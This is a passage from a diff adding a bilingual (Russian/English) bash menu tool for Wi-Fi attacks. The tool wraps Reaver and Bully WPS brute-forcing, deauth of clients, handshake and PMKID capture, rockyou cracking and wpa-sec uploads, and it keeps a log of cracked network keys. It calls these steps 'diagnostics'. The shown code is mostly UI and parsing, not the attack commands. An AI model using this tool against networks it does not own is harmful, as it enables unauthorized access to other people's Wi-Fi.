+[msg_saved]="СЕТЬ СОХРАНЕНА В ЖУРНАЛЕ!" [msg_file]="Файл:"
+[msg_intr]="Скрипт прерван. Терминал восстановлен."
+[msg_init]="Инициализация Wi-Fi Manager..."
+[err_bully]="Bully не найден!" [err_hcx]="hcxdumptool не установлен!"
+[err_inst]="installwh не установлен!" [err_wstart]="wifistart не найден!"
+[pick_adapter]="Выберите Wi-Fi адаптер" [no_adapter]="Wi-Fi адаптер с поддержкой monitor mode не найден!"
+[adapter_usb]="USB" [adapter_pci]="встроенный" [pick_hint]="[Enter] выбрать | [Esc] отмена"
+[pmk_mode_t]="Режим захвата PMKID" [pmk_timer]="По таймеру (задать секунды)"
+[pmk_auto]="До первого PMKID (авто-стоп)" [pmk_manual]="Вручную (Ctrl+C — стоп)" [pmk_stopkey]="Нажми Ctrl+C чтобы остановить..."
+[pmk_stopctrlc]="[любая клавиша] — остановить захват"
+[pmk_active]="Активный (deauth — бить выбранную сеть)" [pmk_active_run]="Активная атака на сеть (deauth)..."
+[pmk_hs_full]="Полный handshake (deauth клиентов, M1-M4)"
+[hs_who]="Кого выбивать (deauth)?" [hs_all]="Всех клиентов сети (авто)" [hs_one]="Конкретного клиента (по MAC)"
+[hs_result_t]="РЕЗУЛЬТАТ ЗАХВАТА HANDSHAKE"
+[hs_caught]="HANDSHAKE ПОЙМАН!" [hs_not_caught]="Handshake НЕ пойман."
+[hs_no_cap]="Файл захвата не создан или пуст."
+[hs_file_at]="Файл:" [hs_next]="Что дальше:"
+[hs_next_crack]="Проверь пароль: Диагностика → Работа с хэшем"
+[hs_next_online]="Или залей онлайн: Работа с хэшем → Онлайн (wpa-sec)"
+[hs_why]="Почему не поймался:"
+[hs_why1]="К сети никто не был подключён (airodump ждёт пассивно)."
+[hs_why2]="Клиент не переподключался во время захвата."
+[hs_tip_deauth]="Совет: используй режим «Полный handshake (deauth)» — он сам выбивает клиентов."
+[hs_client_mac]="MAC клиента (напр. AA:BB:CC:11:22:33):" [hs_running]="Ловлю полный handshake (deauth)..."
+[pmk_stat_useless]="PMKID неполные (useless):"
+[pmk_secs]="Сколько секунд ловить? (например 60):" [pmk_capturing]="Идёт захват..."
+[pmk_wait_auto]="Ловлю до первого PMKID, потом сам остановлюсь..."
+[pmk_stat_t]="=== Итог захвата ===" [pmk_stat_net]="Сетей в эфире:"
+[pmk_stat_pmkid]="PMKID поймано:" [pmk_stat_hs]="Handshake поймано:"
+[pmk_nofile]="Файл захвата не создан (адаптер в мониторе?)."
+[pmk_no_hash_in]="В этом файле нет годного хэша (ни PMKID, ни рукопожатия) — проверять нечего."
+[pmk_empty]="Ничего не поймано. Попробуй ближе к роутеру или дольше."
+[pmk_hashok]="Хэш готов:" [pmk_saved_cap]="Файл захвата:"
+[pmk_next_t]="Что делать с хэшем?" [pmk_check_base]="Локальная проверка (cracked + rockyou, без GPU)"
+[stage1_run]="Этап 1: проверка по базе засвеченных паролей (cracked.txt)..."
+[stage1_miss]="В быстрой базе не найдено."
+[stage2_ask]="Прогнать по большому словарю rockyou (~14 млн)? Это дольше."
+[stage2_skip]="Пропущено. Можешь залить онлайн (wpa-sec)."
+[stage2_run]="Этап 2: перебор по rockyou..." [stage2_wait]="Это может занять время (CPU). Ctrl+C — прервать."
+[rock_dl]="Скачиваю словарь rockyou (~133МБ)..."
+[pmk_online]="Залить онлайн на wpa-sec" [pmk_justsave]="Просто сохранить хэш (файл уже в папке)"
+[pmk_base_dl]="Скачиваю базу известных паролей..." [pmk_base_run]="Проверяю хэш по базе..."
+[pmk_cracked]="ПАРОЛЬ НАЙДЕН!" [pmk_notcracked]="В базе не найдено. Попробуй онлайн (сложный пароль)."
+[pmk_need_key]="Нужен бесплатный ключ с wpa-sec.stanev.org (открой сайт, скопируй Key):"
+[pmk_uploading]="Загружаю на wpa-sec..." [pmk_uploaded]="Загружено! Результат позже на wpa-sec.stanev.org (твой Key)."
+[pmk_sent]="Отправлено на wpa-sec." [pmk_sent_note]="Если сети новые — появятся в 'Мои сети'. Дубликаты сервер игнорирует."
+[pmk_srv_said]="Ответ сервера:" [pmk_only_pcap]="Заливать можно только .pcapng/.pcap/.cap (не .22000)."
+[pmk_res_have]="Есть взломанные сети:"
+[an_title]="Анализ захвата (что внутри):" [an_pmkid]="PMKID (готовых):"
+[an_full]="Полный handshake (есть M3/M4) — максимальный шанс." [an_pmkid_only]="Только PMKID / M1M2 (без M3). Взламываемо, но сервер может просить полный handshake."
+[an_empty]="В файле нет ни PMKID, ни пар EAPOL — заливать нечего." [an_ask_anyway]="Всё равно отправить?"
+[pmk_upfail]="Ошибка загрузки (нет сети или ключа)." [pmk_hint_result]="Готовый пароль ищи в файле:"
+[pmk_no_hcx]="hcxtools не установлен — обнови: sudo installwh"
+[pmk_up_new]="Залить хэш онлайн (wpa-sec)" [pmk_up_check]="Проверить результаты (взломано?)"
+[pmk_up_log]="Мои заливки (журнал + ссылка)" [pmk_log_empty]="Журнал заливок пуст."
+[pmk_up_manual]="Совет: если не проходит, залей файл вручную на сайте (кнопка Submit)."
+[pmk_your_link]="Твоя ссылка на результаты (открой в браузере):"
+[pmk_checking]="Запрашиваю результаты с wpa-sec..." [pmk_no_net]="Нет связи с сервером — работаю офлайн."
+[pmk_res_cracked]="ВЗЛОМАНО" [pmk_res_pending]="в очереди" [pmk_log_hdr]="Дата | Сеть | Файл | Статус"
+[pmk_res_ok]="Связь с wpa-sec есть, ответ получен." [pmk_res_none_cracked]="Взломанных сетей пока нет — всё в очереди на подбор. Загляни позже."
+)
+declare -A TR_EN=(
+[title_main]="WI-FI MANAGER MAIN MENU" [mon]="Monitor:" [net]="Network:"
+[nostart]="Not started" [nosel]="Not selected" [hint]="[Enter] ok | [Esc] back"
+[hint2]="[Esc] back | [Enter] continue"
+[m1]="Interface setup (wifistart)" [m2]="Network scanning"
+[m3]="WPS Diagnostics (Reaver / Bully)" [m4]="WPA/WPA2 Diagnostics (Handshake / PMKID)"
+[m5]="Manual command input" [m6]="Tools: status & update"
+[m7]="Saved networks" [m8]="Language / Язык" [m9]="Finish interface (wifistop)"
+[m_exit]="Exit"
+[settings_t]="Settings"
+[help_t]="Help (menu descriptions + commands)"
+[help_hint]="Pick a section — description and ready-to-use commands will open."
+[help_search]="🔍 Search by keyword"
+[help_search_q]="What to search (word):" [help_search_res]="Search results for"
+[help_search_none]="Nothing found. Try another word."
+[scan_t]="Network scanning" [s1]="WPS scan (wash -F)" [s2]="Full scan (airodump-ng)"
+[scan_live]="Scanning... [Esc] stop and save" [scan_hint]="[Enter] attack | [Esc] exit"
+[scan_saved]="Log saved:" [scan_none]="No networks found." [scan_cnt]="Networks:"
+[atk_t]="Network diagnostics" [atk_pixie]="Pixie-Dust (Reaver -K)" [atk_reaver]="Reaver (PIN bruteforce)"
+[atk_bully]="Bully (-F -B)" [atk_hs]="Capture Handshake" [atk_pmkid]="Capture PMKID"
+[atk_note]="Save to notes" [atk_cancel]="Cancel"
+[back]="Back to main menu" [wps_t]="WPS Diagnostics"
+[w1]="Reaver: Pixie-Dust (offline, -K)" [w2]="Reaver: classic brute-force"
+[w3]="Bully: forced brute-force (-F -B)" [w4]="Change network (BSSID/Channel)"
+[wpa_t]="WPA/WPA2 Diagnostics" [p1]="Capture Handshake (airodump)"
+[p2]="Capture PMKID for selected network" [p3]="Brute-force Handshake (aircrack-ng)"
+[p2air]="Capture PMKID — whole air (standard)" [p5hash]="Work with hash (local / online)"
+[pmk_alltgt]="all networks (air)"
+[pmk_hcx_err]="hcxdumptool exited with an error (output below):"
+[pmk_hash_t]="Work with existing hash" [pmk_hash_none]="No ready hashes in the folder yet."
+[pmk_pick_t]="Pick a hash / capture file" [pmk_files_in]="Files are in folder:"
+[pmk_hash_manual]="Enter file path manually (.pcapng)"
+[pmk_hash_path]="Full path to .pcapng file:"
+[tools_t]="Tools" [t1]="Show status & version freshness"
+[t2]="Update & rebuild all"
+[t_base]="Update password base (cracked.txt)"
+[t_rock]="Update rockyou wordlist (~133MB)"
+[dl_direct]="Downloading directly:" [dl_via_proxy]="Direct failed — downloading via proxy:"
+[dl_no_proxy]="No proxy found — tried directly."
+[base_unpack]="Unpacking..." [base_ok]="Ready:"
+[dl_fail_manual]="Download failed (throttling/block/no net)."
+[why_cracked]="Without this file 'Stage 1' won't work in menu 'WPA/WPA2 Diagnostics → Work with hash → Local check (cracked + rockyou)' — a quick check of your hash against already-exposed (cracked) passwords."
+[why_rockyou]="Without this file 'Stage 2' won't work in the same 'Local check (cracked + rockyou)' item — brute-forcing your hash against the big rockyou wordlist (~14M passwords). Only the wpa-sec online check will remain."
+[dl_after]="Once the file is in the folder, the check will work automatically."
+[dl_url]="Download manually from:" [dl_unpack_to]="Unpack and place it HERE (without .gz):"
+[dl_hint_cmd]="Or with one command:"
+[upd]="Update (download fresh version)" [reb]="Rebuild from local sources"
+[frc]="Force update (clean clone+build)" [u_wh]="Update wh script"
+[hist_t]="SAVED NETWORKS" [hist_empty]="Saved networks list is empty."
+[h_date]="Date" [h_sel]="select" [h_add]="add manually" [h_back]="back"
+[h_card]="NETWORK" [h_edit]="edit" [h_del]="delete" [h_del_q]="Delete this record?"
+[yes]="yes" [no]="no" [h_updated]="Record existed — updated" [h_saved]="Saved"
+[lang_t]="Language / Язык"
+[pr_bssid]="Enter network BSSID:" [pr_bssid_list]="Enter network BSSID (from list above):"
+[pr_chan]="Enter channel:" [pr_cap]="Path to .cap/.pcap:" [pr_dict]="Path to dictionary:"
+[pr_cmd]="Enter command (Esc to cancel):" [pr_cancel]="(Esc to cancel)"
+[pr_enterfor]="(Enter for:"
+[msg_nomon]="Monitor mode is not up!"
+[msg_startw]="[Enter] run wifistart | [Esc] cancel"
+[msg_cancel]="Cancelled." [msg_monfail]="Failed to bring up monitor."
+[msg_run]="> Running:" [msg_done]="✓ Done. [Esc] menu | [Enter] continue"
+[wps_verdict]="Attack result:"
+[wps_ok]="Success! Key/PIN found (see above and in notes)."
+[wps_locked]="WPS locked on the router (protection triggered or WPS disabled)."
+[wps_nack]="AP rejected the attempt (NACK). WPS closed or protected."
+[wps_weak]="Timeout/weak link — network far away or weak signal."
+[wps_nobeacon]="Couldn't catch the network (no beacon). Check channel/distance."
+[wps_unknown]="Done. Details are in the attack log (file above)."
+[wps_try_pmkid]="Tip: for this network try PMKID or Handshake instead of WPS."
+[press_hint]="[Esc] menu | [Enter] continue"
+[msg_saved]="NETWORK SAVED TO LOG!" [msg_file]="File:"
+[msg_intr]="Script interrupted. Terminal restored."
+[msg_init]="Initializing Wi-Fi Manager..."
+[err_bully]="Bully not found!" [err_hcx]="hcxdumptool is not installed!"
+[err_inst]="installwh is not installed!" [err_wstart]="wifistart not found!"
+[pick_adapter]="Choose Wi-Fi adapter" [no_adapter]="No Wi-Fi adapter with monitor mode support found!"
+[adapter_usb]="USB" [adapter_pci]="built-in" [pick_hint]="[Enter] select | [Esc] cancel"
+[pmk_mode_t]="PMKID capture mode" [pmk_timer]="By timer (set seconds)"
+[pmk_auto]="Until first PMKID (auto-stop)" [pmk_manual]="Manual (Ctrl+C to stop)" [pmk_stopkey]="Press Ctrl+C to stop..."
+[pmk_stopctrlc]="[any key] — stop capture"
+[pmk_active]="Active (deauth — attack selected network)" [pmk_active_run]="Active attack on network (deauth)..."
+[pmk_hs_full]="Full handshake (deauth clients, M1-M4)"
+[hs_who]="Whom to deauth?" [hs_all]="All clients of the network (auto)" [hs_one]="Specific client (by MAC)"
+[hs_result_t]="HANDSHAKE CAPTURE RESULT"
+[hs_caught]="HANDSHAKE CAPTURED!" [hs_not_caught]="Handshake NOT captured."
+[hs_no_cap]="Capture file not created or empty."
+[hs_file_at]="File:" [hs_next]="What's next:"
+[hs_next_crack]="Check password: Diagnostics → Work with hash"
+[hs_next_online]="Or upload online: Work with hash → Online (wpa-sec)"
+[hs_why]="Why it wasn't caught:"
+[hs_why1]="No client was connected (airodump waits passively)."
+[hs_why2]="No client reconnected during capture."
+[hs_tip_deauth]="Tip: use 'Full handshake (deauth)' mode — it kicks clients itself."
+[hs_client_mac]="Client MAC (e.g. AA:BB:CC:11:22:33):" [hs_running]="Capturing full handshake (deauth)..."
+[pmk_stat_useless]="PMKID incomplete (useless):"
+[pmk_secs]="How many seconds to capture? (e.g. 60):" [pmk_capturing]="Capturing..."
+[pmk_wait_auto]="Waiting for first PMKID, then auto-stop..."
+[pmk_stat_t]="=== Capture summary ===" [pmk_stat_net]="Networks on air:"
+[pmk_stat_pmkid]="PMKID captured:" [pmk_stat_hs]="Handshake captured:"
+[pmk_nofile]="Capture file not created (adapter in monitor?)."
+[pmk_no_hash_in]="No valid hash in this file (no PMKID, no handshake) — nothing to check."
+[pmk_empty]="Nothing captured. Try closer to the router or longer."
+[pmk_hashok]="Hash ready:" [pmk_saved_cap]="Capture file:"
+[pmk_next_t]="What to do with the hash?" [pmk_check_base]="Local check (cracked + rockyou, no GPU)"
+[stage1_run]="Stage 1: checking against exposed-password base (cracked.txt)..."
+[stage1_miss]="Not found in the quick base."
+[stage2_ask]="Run against big rockyou wordlist (~14M)? This takes longer."
+[stage2_skip]="Skipped. You can upload online (wpa-sec)."
+[stage2_run]="Stage 2: brute-forcing with rockyou..." [stage2_wait]="This may take a while (CPU). Ctrl+C to abort."
+[rock_dl]="Downloading rockyou wordlist (~133MB)..."
+[pmk_online]="Upload online to wpa-sec" [pmk_justsave]="Just save the hash (file already in folder)"
+[pmk_base_dl]="Downloading known-password base..." [pmk_base_run]="Checking hash against base..."
+[pmk_cracked]="PASSWORD FOUND!" [pmk_notcracked]="Not found in base. Try online (complex password)."
+[pmk_need_key]="Need a free key from wpa-sec.stanev.org (open site, copy Key):"
+[pmk_uploading]="Uploading to wpa-sec..." [pmk_uploaded]="Uploaded! Result later at wpa-sec.stanev.org (your Key)."
+[pmk_sent]="Sent to wpa-sec." [pmk_sent_note]="If networks are new — they'll appear in 'My nets'. Server ignores duplicates."
+[pmk_srv_said]="Server said:" [pmk_only_pcap]="Only .pcapng/.pcap/.cap can be uploaded (not .22000)."
+[pmk_res_have]="Cracked networks:"
+[an_title]="Capture analysis (what's inside):" [an_pmkid]="PMKID (ready):"
+[an_full]="Full handshake (M3/M4 present) — best chance." [an_pmkid_only]="PMKID / M1M2 only (no M3). Crackable, but server may ask for full handshake."
+[an_empty]="No PMKID or EAPOL pairs in file — nothing to upload." [an_ask_anyway]="Upload anyway?"
+[pmk_upfail]="Upload error (no network or key)." [pmk_hint_result]="Look for the cracked password in file:"
+[pmk_no_hcx]="hcxtools not installed — update: sudo installwh"
+[pmk_up_new]="Upload hash online (wpa-sec)" [pmk_up_check]="Check results (cracked?)"
+[pmk_up_log]="My uploads (log + link)" [pmk_log_empty]="Upload log is empty."
+[pmk_up_manual]="Tip: if it won't go through, upload the file manually on the site (Submit button)."
+[pmk_your_link]="Your results link (open in browser):"
+[pmk_checking]="Requesting results from wpa-sec..." [pmk_no_net]="No server connection — working offline."
+[pmk_res_cracked]="CRACKED" [pmk_res_pending]="pending" [pmk_log_hdr]="Date | Network | File | Status"
+[pmk_res_ok]="Connected to wpa-sec, response received." [pmk_res_none_cracked]="No cracked networks yet — all queued for cracking. Check back later."
+)
+t(){ if [ "$LANG_UI" = en ]; then echo "${TR_EN[$1]:-$1}"; else echo "${TR_RU[$1]:-$1}"; fi; }
+# L "русский" "english" — инлайн-строка на выбранном языке
+L(){ if [ "$LANG_UI" = en ]; then echo "$2"; else echo "$1"; fi; }
+
+find_mon_iface() {
+    MON=""
+    # 1. Если есть файл-подсказка — проверим, ЖИВ ли этот интерфейс и в monitor ли он
+    if [ -f /tmp/.wifistart_mon ]; then
+        local m; m=$(cat /tmp/.wifistart_mon 2>/dev/null)
+        if [ -n "$m" ] && iw dev "$m" info 2>/dev/null | grep -q "type monitor"; then
+            MON="$m"; return 0
+        else
+            # Интерфейс из файла мёртв — удаляем устаревший файл
+            rm -f /tmp/.wifistart_mon
+        fi
+    fi
+    # 2. Фолбэк: ищем любой живой monitor-интерфейс в системе
+    local cand
+    for cand in $(iw dev 2>/dev/null | awk '/Interface/{print $2}'); do
+        if iw dev "$cand" info 2>/dev/null | grep -q "type monitor"; then
+            MON="$cand"; echo "$MON" > /tmp/.wifistart_mon; return 0
+        fi
+    done
+    MON=""
+    return 1
+}
+
+require_mon() {
+    find_mon_iface
+    [ -n "$MON" ] && return 0
+    echo -e "\n${RED}✗ $(t msg_nomon)${NC}"
+    echo -e "${CYAN}$(t msg_startw)${NC}"
+    local k; IFS= read -rsn1 k
+    if [[ $k == $'\e' ]]; then echo -e "${RED}✖ $(t msg_cancel)${NC}"; sleep 1; return 1; fi
+    wifistart_main
+    find_mon_iface
+    [ -n "$MON" ] && return 0
+    echo -e "${RED}$(t msg_monfail)${NC}"; sleep 2; return 1
+}
+
+get_bully() {
+    command -v bully 2>/dev/null && return 0
+    local p
+    for p in /root/bully/src/bully /home/*/bully/src/bully; do
+        [ -x "$p" ] && { echo "$p"; return 0; }
+    done
+    return 1
+}
+
+read_key() {
+    local key rest
+    # Ctrl+C во время ожидания клавиши = ведёт себя как Esc (возврат),
+    # НЕ убивает скрипт. Ловим SIGINT локально и превращаем в esc.
+    local __int=0
+    trap '__int=1' INT
+    if ! IFS= read -rsn1 -t 30 key; then
+        trap ':' INT
+        [ "$__int" = 1 ] && { echo "esc"; return; }   # прервано Ctrl+C → esc
+        echo "none"; return                            # просто таймаут
+    fi
+    trap ':' INT
+    [ "$__int" = 1 ] && { echo "esc"; return; }        # Ctrl+C во время чтения → esc
+    if [[ $key == $'\e' ]]; then read -rsn2 -t 0.1 rest; key+="$rest"; fi
+    case "$key" in
+        $'\e[A') echo "up" ;; $'\e[B') echo "down" ;;
+        "") echo "enter" ;; $'\e') echo "esc" ;;
+        [1-9]) echo "num:$key" ;; *) echo "other" ;;
+    esac
+}
+
+draw_menu() {
+    local title="$1"; shift; local options=("$@")
+    clear
+    echo -e "${CYAN}${BOLD}========================================${NC}"
+    echo -e "${CYAN}${BOLD}      $title      ${NC}"
+    echo -e "${CYAN}${BOLD}========================================${NC}"
+    local mon_color="${RED}"
+    [ -n "$MON" ] && mon_color="${GREEN}"
+    echo -e " ${mon_color}$(t mon)${NC} ${MON:-$(t nostart)} | ${YELLOW}$(t net)${NC} ${TARGET_BSSID:-$(t nosel)}"
+    echo -e "${CYAN}----------------------------------------${NC}"
+    for i in "${!options[@]}"; do
+        local opt="${options[$i]}"
+        local color="${opt%%|*}"; local text="${opt#*|}"
+        if [ "$i" -eq "$SELECTED_IDX" ]; then
+            echo -e " ${BG_SEL}${WHITE}${BOLD} > $text ${NC}"
+        else
+            echo -e " ${color}   $text${NC}"
+        fi
+    done
+    echo -e "${CYAN}----------------------------------------${NC}"
+    echo -e " ${WHITE}$(t hint)${NC}"
+}
+
+with_saved_idx() {
+    local saved=$SELECTED_IDX
+    "$@"
+    SELECTED_IDX=$saved
+}
+
+save_crack() {
+    local output="$1" pin psk ssid
+    pin=$(echo "$output" | grep -oP "WPS PIN:\s*'\K[^']+" | tail -1)
+    [ -z "$pin" ] && pin=$(echo "$output" | grep -oP "Pin is '\K[^']+" | tail -1)
+    psk=$(echo "$output" | grep -oP "WPA PSK:\s*'\K[^']+" | tail -1)
+    [ -z "$psk" ] && psk=$(echo "$output" | grep -oP "WPA PSK is '\K[^']+" | tail -1)
+    ssid=$(echo "$output" | grep -oP "AP SSID:\s*'\K[^']+" | tail -1)
+    [ -z "$ssid" ] && ssid="$TARGET_BSSID"
+    [ -z "$psk" ] && return 0
+    db_upsert "$ssid" "$TARGET_BSSID" "$TARGET_CHANNEL" "$pin" "$psk"
+    echo -e "\n${GREEN}${BOLD}══════════════════════════════════════${NC}"
+    echo -e "${GREEN}${BOLD}   $(t msg_saved)${NC}"
+    echo -e "${GREEN}${BOLD}══════════════════════════════════════${NC}"
+    echo -e " ${YELLOW}SSID:${NC} $ssid   ${YELLOW}PSK:${NC} $psk"
+    echo -e " ${YELLOW}$(t msg_file)${NC} $HACK_LOG"
+    echo -e "${GREEN}${BOLD}══════════════════════════════════════${NC}"
+    sleep 3
+    return 0
+}
+
+# Разбор лога reaver/bully → понятная подсказка что произошло и что делать.
+# Только ЧИТАЕТ готовый лог и печатает вывод — ничего не запускает, не трогает захват.
+explain_wps_result() {
+    local log="$1"
+    [ -f "$log" ] || return
+    local txt; txt=$(cat "$log" 2>/dev/null)
+    [ -z "$txt" ] && return
+    echo -e "\n${CYAN}${BOLD}$(t wps_verdict)${NC}"
+    echo -e "${WHITE}------------------------------------${NC}"
+    # разбор по характерным строкам (порядок важен: от «успех» к «причинам провала»)
+    if printf '%s' "$txt" | grep -qiE "WPS PIN:|WPA PSK:|Pin is|PSK is"; then
+        echo -e " ${GREEN}${BOLD}$(t wps_ok)${NC}"                       # нашёл ключ
+    elif printf '%s' "$txt" | grep -qiE "WPS (setup )?locked|AP (rate|is) locked|WARNING.*locked"; then
+        echo -e " ${YELLOW}$(t wps_locked)${NC}"                         # WPS заблокирован
+        echo -e " ${WHITE}$(t wps_try_pmkid)${NC}"
+    elif printf '%s' "$txt" | grep -qiE "receive timeout|timeout occurred|Failed to associate|No associations"; then
+        echo -e " ${YELLOW}$(t wps_weak)${NC}"                           # слабый сигнал/нет связи
+    elif printf '%s' "$txt" | grep -qiE "WSC NACK|transaction failed|Failed to recover"; then
+        echo -e " ${YELLOW}$(t wps_nack)${NC}"                           # точка отказала
+        echo -e " ${WHITE}$(t wps_try_pmkid)${NC}"
+    elif printf '%s' "$txt" | grep -qiE "not associated|no beacon|Waiting for beacon"; then
+        echo -e " ${YELLOW}$(t wps_nobeacon)${NC}"                       # не поймал сеть
+    else
+        echo -e " ${WHITE}$(t wps_unknown)${NC}"                         # непонятно — см. лог
+    fi
+    echo -e "${WHITE}------------------------------------${NC}"
+}
+
+run_cmd() {
+    echo -e "\n${YELLOW}$(t msg_run) ${WHITE}$*${NC}\n"
+    # wh игнорирует Ctrl+C, пока работает команда — прервётся только сама команда, не скрипт
+    trap '' INT
+    case "$*" in
+        *reaver*|*bully*)
+            # КАРДИНАЛЬНО: используем `script` — он гоняет команду в настоящем
+            # псевдо-терминале (pty), поэтому reaver/bully видят "живой терминал"
+            # и выдают статистику в реальном времени НА ЭКРАН, а `script`
+            # одновременно пишет всё это в файл (для save_crack). Никакого tee/буфера.
+            local tmp keep=""
+            if [ -n "${RUN_LOG:-}" ]; then tmp="$RUN_LOG"; keep=1; else tmp=$(mktemp); fi
+            if command -v script >/dev/null 2>&1; then
+                # script -q -e -c "cmd" file : -q тихо, -e вернуть код команды, pty сохраняет живой вывод
+                ( trap - INT; script -q -e -c "$*" "$tmp" )
+            else
+                # запасной путь без script — прямой вывод (живой), но без лога
+                ( trap - INT; eval "$@" ) | tee "$tmp"
+            fi
+            [ -f "$tmp" ] && save_crack "$(cat "$tmp" 2>/dev/null)"
+            [ -f "$tmp" ] && explain_wps_result "$tmp"
+            if [ -n "$keep" ]; then
+                fix_owner "$tmp" 2>/dev/null
+                echo -e "\n${WHITE}$(t msg_file)${NC} $tmp"
+            else
+                rm -f "$tmp"
+            fi ;;
+        *)
+            ( trap - INT; eval "$@" ) ;;
+    esac
+    trap ':' INT
+    RUN_LOG=""   # сбрасываем, чтобы не протёк на следующий вызов
+    echo -e "\n${GREEN}$(t msg_done)${NC}"
+    local k; IFS= read -rsn1 k
+}
+
+# пауза "нажми клавишу" (Esc/Enter) — короткая подсказка, Ctrl+C не убивает скрипт
+press_any(){ echo -e "\n${CYAN}$(t press_hint)${NC}"; local k; trap ':' INT; IFS= read -rsn1 k; trap ':' INT; }
+
+prompt_input() {
+    local prompt="$1" var_name="$2" default_val="${3:-}" input="" char
+    echo -e "\n${YELLOW}$prompt${NC}"
+    [ -n "$default_val" ] && echo -e "${CYAN}$(t pr_enterfor) $default_val)${NC}"
+    echo -e "${CYAN}$(t pr_cancel)${NC}"
+    # Ctrl+C во время ввода = отмена (как Esc), НЕ убивает скрипт
+    local __int=0
+    trap '__int=1' INT
+    while IFS= read -rsn1 char; do
+        [ "$__int" = 1 ] && { trap ':' INT; echo -e "\n${RED}✖ $(t msg_cancel)${NC}"; sleep 1; return 1; }
+        if [[ $char == $'\e' ]]; then
+            local rest; read -rsn2 -t 0.1 rest
+            if [ -z "$rest" ]; then trap ':' INT; echo -e "\n${RED}✖ $(t msg_cancel)${NC}"; sleep 1; return 1; fi
+        elif [[ $char == "" ]]; then break
+        elif [[ $char == $'\x7f' || $char == $'\x08' ]]; then input="${input%?}"; echo -ne "\b \b"
+        else input+="$char"; echo -n "$char"; fi
+    done
+    trap ':' INT
+    echo
+    [ -z "$input" ] && [ -n "$default_val" ] && input="$default_val"
+    eval "$var_name=\"\$input\""
+    return 0
+}
+
+migrate_db() {
+    [ -f "$HACK_LOG" ] || return 0
+    grep -q '^\[' "$HACK_LOG" 2>/dev/null || return 0
+    local tmp line ts ssid bssid ch pin psk
+    tmp=$(mktemp)
+    while IFS= read -r line; do
+        if [[ $line == \[* ]]; then
+            ts=$(echo "$line" | grep -oP '^\[\K[^\]]+')
+            ssid=$(echo "$line" | grep -oP 'SSID: \K[^|]*' | sed 's/ *$//')
+            bssid=$(echo "$line" | grep -oP 'BSSID: \K[^|]*' | sed 's/ *$//')
+            ch=$(echo "$line" | grep -oP 'Ch: \K[^|]*' | sed 's/ *$//')
+            pin=$(echo "$line" | grep -oP 'PIN: \K[^|]*' | sed 's/ *$//')
+            psk=$(echo "$line" | grep -oP 'PSK: \K[^|]*' | sed 's/ *$//')
+            printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$ssid" "$bssid" "$ch" "$pin" "$psk" "$ts" >> "$tmp"
+        else
+            printf '%s\n' "$line" >> "$tmp"
+        fi
+    done < "$HACK_LOG"
+    mv "$tmp" "$HACK_LOG"
+    fix_owner "$HACK_LOG"
+}
+
+db_key() { local k="$2"; [ -z "$k" ] && k="$1"; echo "$k"; }
+
+db_upsert() { # ssid bssid ch pin psk ; return 0=new 1=updated
+    migrate_db
+    local ssid="$1" bssid="$2" ch="$3" pin="$4" psk="$5"
+    local ts; ts=$(date '+%Y-%m-%d %H:%M:%S')
+    local key; key=$(db_key "$ssid" "$bssid")
+    local tmp; tmp=$(mktemp); local existed=0
+    local s b c p k d
+    if [ -f "$HACK_LOG" ]; then
+        while IFS=$'\t' read -r s b c p k d; do
+            if [ "$(db_key "$s" "$b")" = "$key" ]; then existed=1; continue; fi
+            printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$s" "$b" "$c" "$p" "$k" "$d" >> "$tmp"
+        done < "$HACK_LOG"
+    fi
+    printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$ssid" "$bssid" "$ch" "$pin" "$psk" "$ts" >> "$tmp"
+    mv "$tmp" "$HACK_LOG"
+    fix_owner "$HACK_LOG"
+    return $existed
+}
+
+db_delete() {
+    local n="$1" i=0 tmp; tmp=$(mktemp)
+    local s b c p k d
+    while IFS=$'\t' read -r s b c p k d; do
+        i=$((i+1)); [ "$i" -eq "$n" ] && continue
+        printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$s" "$b" "$c" "$p" "$k" "$d" >> "$tmp"
+    done < "$HACK_LOG"
+    mv "$tmp" "$HACK_LOG"
+    fix_owner "$HACK_LOG"
+}
+
+db_get() {
+    local n="$1" i=0 s b c p k d
+    while IFS=$'\t' read -r s b c p k d; do
+        i=$((i+1))
+        if [ "$i" -eq "$n" ]; then NET_S="$s"; NET_B="$b"; NET_C="$c"; NET_P="$p"; NET_K="$k"; NET_D="$d"; return 0; fi
+    done < "$HACK_LOG"
+    return 1
+}
+
+manual_add() {
+    local s b c p k
+    prompt_input "$(L "SSID (обязательно):" "SSID (required):")" s || return
+    [ -z "$s" ] && { echo -e "${RED}✖ $(t msg_cancel)${NC}"; sleep 1; return; }
+    prompt_input "$(L "BSSID (Enter — пропустить):" "BSSID (Enter — skip):")" b || return
+    prompt_input "$(L "Ch (Enter — пропустить):" "Ch (Enter — skip):")" c || return
+    prompt_input "$(L "PIN (Enter — пропустить):" "PIN (Enter — skip):")" p || return
+    prompt_input "$(L "PSK (Enter — пропустить):" "PSK (Enter — skip):")" k || return
+    if db_upsert "$s" "$b" "$c" "$p" "$k"; then
+        echo -e "${GREEN}✓ $(t h_saved)${NC}"; sleep 1
+    else
+        echo -e "${YELLOW}$(t h_updated)${NC}"; sleep 1
+    fi
+}
+
+edit_entry() {
+    local n="$1" s b c p k
+    db_get "$n" || return
+    prompt_input "SSID:" s "$NET_S" || return
+    prompt_input "BSSID:" b "$NET_B" || return
+    prompt_input "Ch:" c "$NET_C" || return
+    prompt_input "PIN:" p "$NET_P" || return
+    prompt_input "PSK:" k "$NET_K" || return
+    db_delete "$n"
+    db_upsert "$s" "$b" "$c" "$p" "$k"
+}
+
+menu_net_act() {
+    local n="$1"
+    db_get "$n" || return
+    while true; do
+        clear
+        echo -e "${CYAN}${BOLD}========================================${NC}"
+        echo -e "${CYAN}${BOLD}      $(t h_card) $n      ${NC}"
+        echo -e "${CYAN}${BOLD}========================================${NC}"
+        echo -e " ${YELLOW}SSID:${NC} $NET_S"
+        echo -e " ${YELLOW}BSSID:${NC} $NET_B"
+        echo -e " ${YELLOW}Ch:${NC} $NET_C"
+        echo -e " ${YELLOW}PIN:${NC} $NET_P"
+        echo -e " ${YELLOW}PSK:${NC} $NET_K"
+        echo -e " ${YELLOW}$(t h_date):${NC} $NET_D"
+        echo -e "${CYAN}----------------------------------------${NC}"
+        echo -e " ${WHITE}[e] $(t h_edit) | [d] $(t h_del) | [Esc] $(t h_back)${NC}"
+        local key rest
+        if ! IFS= read -rsn1 -t 60 key; then continue; fi
